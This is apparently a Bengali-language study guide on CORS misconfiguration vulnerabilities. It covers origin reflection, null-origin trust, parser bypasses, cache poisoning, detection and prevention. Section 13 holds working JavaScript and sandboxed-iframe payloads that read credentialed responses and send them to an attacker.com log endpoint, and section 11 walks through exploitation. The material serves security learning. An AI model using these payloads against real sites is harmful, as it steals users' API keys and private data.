# Cross-Origin Resource Sharing (CORS)

## 1. What is CORS?

**Short Definition:**
Cross-Origin Resource Sharing (CORS) হলো ব্রাউজারের এমন একটি মেকানিজম, যা একটি ডোমেইনকে (origin) নিয়ন্ত্রিতভাবে অন্য ডোমেইনের রিসোর্স অ্যাক্সেস করার অনুমতি দেয়। এটি মূলত Same-Origin Policy (SOP)-এর একটি controlled relaxation বা শিথিলকরণ।

**Detailed Explanation:**
CORS বোঝার আগে Same-Origin Policy (SOP) বোঝা জরুরি। SOP হলো ব্রাউজারের একটি সিকিউরিটি মেকানিজম যা এক ডোমেইনের স্ক্রিপ্টকে অন্য ডোমেইনের ডেটা পড়তে বাধা দেয়। একটি Origin বলতে URI scheme (`http`/`https`), domain এবং port number-এর সমষ্টিকে বোঝায়। SOP না থাকলে আপনি কোনো ক্ষতিকর ওয়েবসাইটে ভিজিট করলে সেই সাইট আপনার Facebook বা Gmail-এর ডেটা পড়ে ফেলতে পারত।

কিন্তু আধুনিক ওয়েব অ্যাপ্লিকেশনে প্রায়ই থার্ড-পার্টি API বা সাবডোমেইনের সাথে ডেটা আদান-প্রদান করতে হয়। এই প্রয়োজনেই CORS-এর জন্ম। CORS নির্দিষ্ট কিছু HTTP হেডারের (যেমন: `Access-Control-Allow-Origin`) মাধ্যমে ব্রাউজারকে বলে দেয় যে অন্য কোনো নির্দিষ্ট ডোমেইন এই ডেটা পড়তে পারবে কি না। যদি CORS কনফিগারেশন ভুলভাবে করা হয়, তবে অ্যাটাকার SOP বাইপাস করে ইউজারের সেনসিটিভ ডেটা চুরি করতে পারে।

## 2. Why Does It Happen?

CORS ভালনারেবিলিটি মূলত ডেভেলপারদের ভুল কনফিগারেশন (misconfiguration) এবং ব্রাউজারের কিছু সীমাবদ্ধতার কারণে ঘটে।
CORS স্পেসিফিকেশনে একাধিক ডোমেইন বা সাবডোমেইনের জন্য স্পেস-সেপারেটেড লিস্ট বা আংশিক ওয়াইল্ডকার্ড (যেমন: `*.normal-website.com`) সাপোর্ট করে না। আবার, `*` ওয়াইল্ডকার্ড ব্যবহার করলে ক্রেডেনশিয়াল (যেমন কুকি) সাপোর্ট করে না।

এই সীমাবদ্ধতাগুলো এড়ানোর জন্য ডেভেলপাররা প্রায়ই ডাইনামিকভাবে ইউজার-সাপ্লাইড `Origin` হেডার রিড করে এবং কোনো ভ্যালিডেশন ছাড়াই সেটি `Access-Control-Allow-Origin` হেডারে বসিয়ে দেয় (reflect করে)। এর ফলে যেকোনো ডোমেইন (অ্যাটাকারের ডোমেইন সহ) ট্রাস্টেড হয়ে যায়।

## 3. How It Works

1. User একটি ক্ষতিকর ওয়েবসাইটে (Attacker's domain) ভিজিট করে।
2. ক্ষতিকর ওয়েবসাইটটি JavaScript-এর মাধ্যমে ভিকটিমের ব্রাউজার ব্যবহার করে টার্গেট অ্যাপ্লিকেশনে একটি cross-domain রিকোয়েস্ট পাঠায় (যেখানে ভিকটিমের সেশন কুকি যুক্ত থাকে)।
3. রিকোয়েস্টে ব্রাউজার স্বয়ংক্রিয়ভাবে একটি `Origin: [https://attacker.com](https://attacker.com)` হেডার যুক্ত করে দেয়।
4. টার্গেট অ্যাপ্লিকেশন ভুল কনফিগারেশনের কারণে যাচাই না করেই রেসপন্সে `Access-Control-Allow-Origin: [https://attacker.com](https://attacker.com)` এবং `Access-Control-Allow-Credentials: true` পাঠিয়ে দেয়।
5. ব্রাউজার দেখে যে টার্গেট সার্ভার অ্যাটাকারের ডোমেইনকে অনুমতি দিয়েছে, তাই সে অ্যাটাকারের JavaScript-কে রেসপন্স (সেনসিটিভ ডেটা) পড়ার অনুমতি দেয়।
6. অ্যাটাকার ডেটাটি নিজের সার্ভারে পাঠিয়ে দেয়।

## 4. Simple Example

**Normal SOP Behavior:**
`malicious.com` থেকে `bank.com`-এ রিকোয়েস্ট গেলে `bank.com` রেসপন্স দেয়, কিন্তু ব্রাউজার `malicious.com`-কে সেই রেসপন্স পড়তে দেয় না।

**Vulnerable CORS Behavior:**
`malicious.com` থেকে রিকোয়েস্ট গেলে `bank.com` রেসপন্সে বলে দেয় `Access-Control-Allow-Origin: [https://malicious.com](https://malicious.com)`। তখন ব্রাউজার `malicious.com`-কে `bank.com`-এর রেসপন্স পড়ার অনুমতি দিয়ে দেয়।

## 5. Technical Example

**Vulnerable Request:**

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

```

**Vulnerable Response:**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true

{"private_api_key": "secret-key-123"}

```

**Explanation:**
এখানে অ্যাপ্লিকেশনটি ইউজারের দেওয়া `Origin` হেডারটি অন্ধভাবে বিশ্বাস করে `Access-Control-Allow-Origin` হেডারে রিফ্লেক্ট করেছে এবং `Access-Control-Allow-Credentials: true` দিয়েছে। এর মানে হলো `malicious-website.com` এখন ভিকটিমের সেশন ব্যবহার করে এই API Key পড়তে পারবে।

## 6. Attack Flow

Attacker
↓
Create a malicious website with CORS exploitation JavaScript
↓
Trick authenticated victim into visiting the malicious website
↓
Victim's browser sends cross-origin request to vulnerable application
↓
Application reflects attacker's origin in CORS headers
↓
Browser allows malicious JavaScript to read the response
↓
JavaScript sends the stolen sensitive data to attacker's server

## 7. Important Conditions / Requirements

* টার্গেট অ্যাপ্লিকেশনে `Access-Control-Allow-Credentials: true` সেট করা থাকতে হবে (যাতে কুকি বা সেশন ব্যবহার করা যায়)।
* টার্গেট রেসপন্সে সেনসিটিভ ডেটা (যেমন: API key, CSRF token, personal info) থাকতে হবে।
* ভিকটিমকে টার্গেট অ্যাপ্লিকেশনে আগে থেকে লগ-ইন (authenticated) থাকতে হবে।
* ভিকটিমকে অ্যাটাকারের কন্ট্রোল করা ওয়েবসাইটে ভিজিট করতে হবে।

## 8. Types / Variations

### A. Server-generated ACAO header from client-specified Origin header

**What is it?** অ্যাপ্লিকেশন ক্লায়েন্টের পাঠানো `Origin` হেডারটিকে সরাসরি `Access-Control-Allow-Origin` (ACAO) হেডারে বসিয়ে দেয়।
**How it works:** ডেভেলপাররা মাল্টিপল ডোমেইন ম্যানেজ করার ঝামেলা এড়াতে ডাইনামিক রিফ্লেকশন ব্যবহার করে। অ্যাটাকার যেকোনো `Origin` পাঠালে সেটি ট্রাস্টেড হয়ে যায়।

### B. Errors parsing Origin headers

**What is it?** অ্যাপ্লিকেশন একটি whitelist ব্যবহার করে, কিন্তু URL পার্সিং বা রেগুলার এক্সপ্রেশন (Regex) ঠিকমতো না লেখার কারণে ভুল ডোমেইন অ্যালাউ হয়ে যায়।
**Variations:**

* **Suffix matching flaw:** যদি `normal-website.com` অ্যালাউ করা থাকে, তবে অ্যাটাকার `hackersnormal-website.com` ডোমেইন কিনে অ্যাক্সেস পেতে পারে।
* **Prefix matching flaw:** অ্যাটাকার `normal-website.com.evil-user.net` ব্যবহার করতে পারে।
* **Browser parser discrepancies:** Safari ব্রাউজার অদ্ভুত ক্যারেক্টার টলারেট করতে পারে। যেমন: `[http://example.com](http://example.com)%60.hackxor.net/` (এখানে `%60` বা ব্যাকটিক `\``)। সার্ভার হয়তো একে `example.com`ভেবে অ্যালাউ করে দেবে, কিন্তু Safari এটিকে`hackxor.net`-এর সাবডোমেইন হিসেবে পার্স করবে।

### C. Whitelisted null origin value

**What is it?** `Origin` হেডারের ভ্যালু `null` হলে অ্যাপ্লিকেশন তা ট্রাস্ট করে।
**How it works:** Local HTML file, cross-origin redirects, বা sandboxed iframes থেকে রিকোয়েস্ট এলে ব্রাউজার `Origin: null` পাঠায়। ডেভেলপাররা লোকাল ডেভেলপমেন্টের সুবিধার জন্য `null` অ্যালাউ করে রাখে। অ্যাটাকার `<iframe sandbox="...">` ব্যবহার করে `null` অরিজিন জেনারেট করে ডেটা চুরি করতে পারে।

### D. Exploiting XSS via CORS trust relationships

**What is it?** যদি একটি সেনসিটিভ অ্যাপ্লিকেশন তার কোনো সাবডোমেইনকে CORS-এর মাধ্যমে ট্রাস্ট করে, তবে সেই সাবডোমেইনে XSS থাকলে মূল অ্যাপ্লিকেশনের ডেটা চুরি করা সম্ভব।
**Example:** `vulnerable.com` যদি `subdomain.vulnerable.com`-কে ট্রাস্ট করে, তবে অ্যাটাকার সাবডোমেইনের XSS ব্যবহার করে মূল ডোমেইনের API Key চুরি করতে পারে।

### E. Breaking TLS with poorly configured CORS

**What is it?** একটি কঠোর HTTPS অ্যাপ্লিকেশন যদি ভুল করে কোনো HTTP সাবডোমেইনকে CORS-এ ট্রাস্ট করে।
**How it works:** অ্যাটাকার ভিকটিমের প্লেইন HTTP ট্রাফিক MITM (Man-in-the-Middle) করে ইন্টারসেপ্ট করে। এরপর ভিকটিমকে সেই ট্রাস্টেড HTTP সাবডোমেইনে রিডাইরেক্ট করে একটি ফেক CORS রিকোয়েস্ট ইনজেক্ট করে। অ্যাপ্লিকেশন ট্রাস্টেড অরিজিন দেখে ডেটা দিয়ে দেয়।

### F. Intranets and CORS without credentials

**What is it?** প্রাইভেট নেটওয়ার্কের (Intranet) কোনো ইন্টারনাল সার্ভার যদি `Access-Control-Allow-Origin: *` ব্যবহার করে।
**How it works:** এখানে Credentials-এর দরকার হয় না। পাবলিক ইন্টারনেট ব্যবহার করা কোনো ইউজার (ভিকটিম) অ্যাটাকারের সাইটে গেলে, অ্যাটাকার ভিকটিমের ব্রাউজারকে প্রক্সি হিসেবে ব্যবহার করে তার ইন্টারনাল নেটওয়ার্কের (যেমন: `[http://intranet.local](http://intranet.local)`) ডেটা পড়ে নিতে পারে।

### G. Cache Poisoning via CORS

**What is it?** `Vary: Origin` হেডার ব্যবহার না করার কারণে ঘটা ক্যাশ পয়জনিং।
**Variations:**

* **Client-Side:** রিফ্লেক্টেড XSS যদি কোনো কাস্টম হেডারে থাকে, তবে CORS রিকোয়েস্টের মাধ্যমে ব্রাউজারে সেই রেসপন্স ক্যাশ করানো যায়। পরে ভিকটিম সরাসরি সেই পেজে গেলে XSS এক্সিকিউট হয়।
* **Server-Side:** সার্ভার যদি `Origin` হেডার কোনো ভ্যালিডেশন ছাড়া ক্যাশ করে। IE/Edge-এ `\r` (0x0d) ক্যারেক্টারকে হেডার টার্মিনেটর হিসেবে ধরা হয়। অ্যাটাকার `Origin: z[0x0d]Content-Type: text/html; charset=UTF-7` পাঠালে সার্ভার তা ক্যাশ করতে পারে, যা পরবর্তীতে অন্য ইউজারদের জন্য XSS তৈরি করে।

## 9. Different Contexts

* **API Endpoints:** সবচেয়ে বেশি CORS ব্যবহার হয় API-তে, যেখানে JSON বা XML ডেটা আদান-প্রদান হয়।
* **Intranet vs Public:** ইন্টারনাল নেটওয়ার্কে `*` ওয়াইল্ডকার্ড অনেক বেশি ক্ষতিকর হতে পারে।
* **Sandboxed IFrames:** `null` অরিজিন এক্সপ্লয়েট করার জন্য ব্যবহৃত হয়।
* **Cache Mechanisms:** `Vary: Origin` না থাকলে ব্রাউজার বা সার্ভার ক্যাশে ক্ষতিকর রেসপন্স স্টোর হতে পারে।

## 10. Exploitation / Practical Understanding

CORS এক্সপ্লয়েট করার মূল লক্ষ্য হলো এমন একটি JavaScript পেলোড তৈরি করা, যা ভিকটিমের ব্রাউজার থেকে টার্গেট সার্ভারে রিকোয়েস্ট পাঠাবে এবং রেসপন্সটি পড়ে আপনার (অ্যাটাকারের) সার্ভারে পাঠিয়ে দেবে।

* **Basic Reflection:** `XMLHttpRequest` বা `fetch` API ব্যবহার করে `withCredentials = true` সেট করে রিকোয়েস্ট পাঠাতে হয়।
* **Null Origin:** একটি `iframe` তৈরি করতে হয় যার `sandbox` অ্যাট্রিবিউটে `allow-scripts` থাকবে কিন্তু `allow-same-origin` থাকবে না। এতে করে ঐ আইফ্রেমের ভেতরের স্ক্রিপ্ট `Origin: null` নিয়ে এক্সিকিউট হবে।
* **Parser Bypasses:** টার্গেট যদি `example.com` অ্যালাউ করে, তবে `example.com.attacker.com` বা `[attacker.com/example.com](https://attacker.com/example.com)` দিয়ে ট্রাই করে দেখতে হবে সার্ভারের পার্সিং লজিক বোকা বনে যায় কি না।

## 11. Step-by-Step Exploitation

Step 1 — Identify the input: Burp Suite ব্যবহার করে সেনসিটিভ ডেটা রিটার্ন করে এমন রিকোয়েস্টগুলো খুঁজুন।
Step 2 — Test the behavior: রিকোয়েস্টে `Origin` হেডার যোগ করুন (যেমন: `Origin: [https://attacker.com](https://attacker.com)` বা `Origin: null`)।
Step 3 — Confirm the vulnerability: রেসপন্সে `Access-Control-Allow-Origin` হেডারে আপনার দেওয়া অরিজিন রিফ্লেক্ট করছে কি না এবং `Access-Control-Allow-Credentials: true` আছে কি না তা লক্ষ্য করুন।
Step 4 — Determine required conditions: নিশ্চিত হোন যে রেসপন্সে আসলেই এমন কোনো ডেটা আছে যা চুরি করলে লাভ হবে (যেমন API Key, PII)।
Step 5 — Exploit the vulnerability: একটি HTML/JS পেলোড তৈরি করুন যা `XMLHttpRequest` ব্যবহার করে ওই ডেটা ফেচ করবে এবং আপনার লগ সার্ভারে পাঠাবে।
Step 6 — Verify the result: পেলোডটি আপনার সার্ভারে হোস্ট করে ব্রাউজার দিয়ে ভিজিট করুন এবং দেখুন ডেটা চুরি হচ্ছে কি না।

## 12. HTTP Requests / Responses

**Pre-flight Request (OPTIONS):**
যখন ব্রাউজার নন-স্ট্যান্ডার্ড মেথড (যেমন `PUT`) বা কাস্টম হেডার পাঠাতে চায়, তখন সে আগে একটি `OPTIONS` রিকোয়েস্ট পাঠায়।

```http
OPTIONS /data HTTP/1.1
Host: some-website.com
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header

```

**Server Response:**

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240

```

*Explanation:* সার্ভার নিশ্চিত করছে যে `PUT` মেথড এবং `Special-Request-Header` অ্যালাউড। এরপর ব্রাউজার আসল রিকোয়েস্ট পাঠাবে।

## 13. Payloads

**Basic CORS Exploitation Script (XHR):**

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/sensitive-data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='//attacker.com/log?key='+this.responseText;
    };
</script>

```

*Purpose:* ভিকটিমের সেশন ব্যবহার করে টার্গেট সাইট থেকে ডেটা পড়া এবং অ্যাটাকারের সার্ভারে পাঠানো।

**Null Origin Exploit via Sandboxed Iframe:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/sensitive-data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://attacker.com/log?key='+this.responseText;
    };
</script>"></iframe>

```

*Purpose:* ব্রাউজারকে বাধ্য করা যেন সে রিকোয়েস্টের সাথে `Origin: null` পাঠায়।

## 14. Burp Suite Workflow

* **Proxy / Repeater:** রিকোয়েস্টে ম্যানুয়ালি `Origin` হেডার বসিয়ে বা পরিবর্তন করে রেসপন্সের ACAO হেডার চেক করতে ব্যবহৃত হয়।
* **Scanner:** Burp Scanner স্বয়ংক্রিয়ভাবে CORS রিফ্লেকশন, `null` অরিজিন সাপোর্ট এবং অন্যান্য কনফিগারেশন ত্রুটি আইডেন্টিফাই করতে পারে।

## 15. How to Identify / Detect

CORS ভালনারেবিলিটি ম্যানুয়ালি ডিটেক্ট করতে টার্গেটের রিকোয়েস্টে `Origin` হেডারে নিচের ভ্যালুগুলো দিয়ে টেস্ট করতে হবে:

1. সম্পূর্ণ ভিন্ন ডোমেইন (e.g., `[https://evil.com](https://evil.com)`)
2. `null`
3. প্রিফিক্স বা সাফিক্স ম্যাচিং (e.g., `[https://target.com.evil.com](https://target.com.evil.com)` বা `[https://evil-target.com](https://evil-target.com)`)
4. স্পেশাল ক্যারেক্টার (e.g., Safari-এর জন্য ব্যাকটিক `%60`)

রেসপন্সে যদি আপনার দেওয়া `Origin` রিফ্লেক্ট হয় এবং সাথে `Access-Control-Allow-Credentials: true` থাকে, তবে এটি ভালনারেবল।

## 16. Common Mistakes

* **Misconception about CSRF:** অনেকেই মনে করে CORS বোধহয় CSRF প্রটেক্ট করে। আসলে CORS CSRF প্রটেক্ট করে না, বরং ভুল কনফিগারেশন CSRF-এর ঝুঁকি বাড়িয়ে দেয়।
* **Whitelisting `null`:** লোকাল ডেভেলপমেন্টের জন্য `null` অ্যালাউ করা প্রডাকশন সার্ভারের জন্য মারাত্মক ভুল।
* **Missing `Vary: Origin`:** ডাইনামিকভাবে ACAO জেনারেট করার পর `Vary: Origin` হেডার না দিলে ক্যাশ পয়জনিং হতে পারে।

## 17. Limitations

* `Access-Control-Allow-Origin: *` এর সাথে কখনোই `Access-Control-Allow-Credentials: true` ব্যবহার করা যায় না (ব্রাউজার ব্লক করে দেয়)।
* CSRF টোকেন যদি রেসপন্সে থাকে, তবে CORS এক্সপ্লয়েট করে সেটি আগে পড়তে হবে, এরপর CSRF অ্যাটাক করতে হবে। শুধু CORS দিয়েই স্টেট-চেঞ্জিং অ্যাকশন সরাসরি এক্সিকিউট করা যায় না, ডেটা চুরি করা যায়।

## 18. Edge Cases / Important Details

* **Safari URL Parsing Quirks:** Safari ব্রাউজার ডোমেইন নেমের মাঝে ব্যাকটিক (```) বা `%60` সাপোর্ট করে। এটি ব্যবহার করে সার্ভারের Regex বাইপাস করা সম্ভব।
* **IE/Edge Header Termination:** IE এবং Edge ব্রাউজার `\r` (0x0d) ক্যারেক্টারকে হেডারের শেষ বলে ধরে নেয়। এটি সার্ভার-সাইড ক্যাশ পয়জনিং-এ ব্যবহৃত হয়।
* **Internet Explorer Port Rule:** SOP প্রয়োগ করার সময় IE পোর্ট নাম্বার বিবেচনা করে না। অর্থাৎ `port 80` এবং `port 8080`-কে সে একই অরিজিন মনে করে।

## 19. Database / Platform / Technology Differences

* **Safari/Chrome:** Safari `%60` (ব্যাকটিক) টলারেট করে, যা পার্সিং বাইপাস করতে সাহায্য করে। Chrome/Firefox-এর ক্ষেত্রে আন্ডারস্কোর (`_`) ব্যবহার করে একই ধরনের রেজাল্ট পাওয়া যেতে পারে।
* **Internet Explorer (Legacy):** `\r` হেডার টার্মিনেটর হিসেবে কাজ করে এবং পোর্ট নাম্বারের ক্ষেত্রে SOP রিলাক্সড।

## 20. Impact

CORS ভালনারেবিলিটির ইমপ্যাক্ট অত্যন্ত গুরুতর হতে পারে:

* **Information Disclosure:** ইউজারের সেনসিটিভ ডেটা, PII, এনক্রিপ্টেড ব্যাকআপ (যেমন: Bitcoin ওয়ালেট) চুরি।
* **Account Takeover:** Private API key চুরি করে ইউজারের অ্যাকাউন্টের সম্পূর্ণ নিয়ন্ত্রণ নেওয়া।
* **CSRF Facilitation:** রেসপন্স থেকে CSRF টোকেন চুরি করে অ্যান্টি-CSRF মেকানিজম বাইপাস করা।

## 21. Prevention / Mitigation

* **Proper Configuration:** `Access-Control-Allow-Origin` হেডারে শুধুমাত্র স্পেসিফিক এবং ট্রাস্টেড ডোমেইন অ্যালাউ করতে হবে। ডাইনামিক রিফ্লেকশন পরিহার করতে হবে।
* **Avoid Whitelisting `null`:** কোনো অবস্থাতেই `null` অরিজিন অ্যালাউ করা যাবে না।
* **Avoid wildcards in internal networks:** ইন্টারনাল নেটওয়ার্কে `*` ব্যবহার করা যাবে না।
* **Vary: Origin:** যদি ডাইনামিকভাবে ACAO জেনারেট করতেই হয়, তবে রেসপন্সে অবশ্যই `Vary: Origin` হেডার যুক্ত করতে হবে যাতে ক্যাশ পয়জনিং না হয়।
* **No HTTP trust from HTTPS:** HTTPS অ্যাপ্লিকেশন থেকে কোনো ইনসিকিউর HTTP অরিজিনকে ট্রাস্ট করা যাবে না।

## 22. Vulnerable vs Secure Example

**Vulnerable:**

```http
// Server blindly reflects Origin
Origin: https://attacker.com
↓
Access-Control-Allow-Origin: https://attacker.com

```

**Secure:**

```http
// Server checks whitelist, attacker is rejected
Origin: https://attacker.com
↓
(No Access-Control-Allow-Origin header in response, or returns error)

```

## 23. Real Understanding

SOP (Same-Origin Policy) হলো আপনার ওয়েবসাইটের ঢাল (Shield), যা অন্য ওয়েবসাইটকে আপনার ইউজারের ডেটা পড়তে বাধা দেয়। CORS হলো সেই ঢালের মধ্যে তৈরি করা একটি নিয়ন্ত্রিত দরজা (Controlled window)। ডেভেলপাররা যখন কনফিগারেশন জটিলতার কারণে এই দরজা সবার জন্য খুলে দেয় (dynamic reflection বা null trust করে), তখন SOP-এর পুরো উদ্দেশ্যই ব্যর্থ হয়ে যায়। অ্যাটাকার তখন ইউজারের ব্রাউজারকেই প্রক্সি হিসেবে ব্যবহার করে ডেটা চুরি করে নেয়।

## 24. Mental Model

Browser sends Request with `Origin`
↓
Server verifies if `Origin` is trusted (Often implemented poorly using regex or reflection)
↓
Server replies with `Access-Control-Allow-Origin` and `Credentials: true`
↓
Browser checks if current domain matches ACAO header
↓
If matched, Browser allows malicious JavaScript to READ the sensitive response.

## 25. Quick Revision

* **Definition:** ব্রাউজার মেকানিজম যা অন্য ডোমেইনকে ডেটা পড়ার অনুমতি দেয় (SOP রিলাক্সেশন)।
* **Cause:** সার্ভারে `Origin` হেডারের ভুল পার্সিং বা ব্লাইন্ড রিফ্লেকশন।
* **Main idea:** ক্ষতিকর সাইট থেকে ইউজারের ব্রাউজার ব্যবহার করে টার্গেট সাইটের ডেটা চুরি।
* **Important condition:** রেসপন্সে `ACAO` এর সাথে `ACAC: true` থাকতে হবে।
* **Main techniques:** Origin reflection, null origin (`iframe sandbox`), URL parsing bypass (`%60`).
* **Impact:** API keys, CSRF tokens, PII চুরি, এবং Account takeover.
* **Prevention:** স্পেসিফিক ডোমেইন ট্রাস্ট করা, `null` বাদ দেওয়া, এবং `Vary: Origin` ব্যবহার করা।

## 26. Things to Remember

* CORS CSRF-এর প্রটেকশন নয়।
* `*` (ওয়াইল্ডকার্ড) এবং `Credentials: true` একসাথে কাজ করে না, ব্রাউজার ব্লক করে দেয়।
* `null` অরিজিন `*`-এর চেয়েও বেশি ভয়ংকর হতে পারে কারণ এটি ক্রেডেনশিয়াল সাপোর্ট করে।
* ইন্টারনাল নেটওয়ার্কের ডেটা চুরি করতে CORS এক্সপ্লয়েট করা যায়, এমনকি ক্রেডেনশিয়াল ছাড়াও।
* ডাইনামিক CORS হেডারের সাথে `Vary: Origin` না দিলে ক্লায়েন্ট-সাইড বা সার্ভার-সাইড ক্যাশ পয়জনিং হতে পারে।
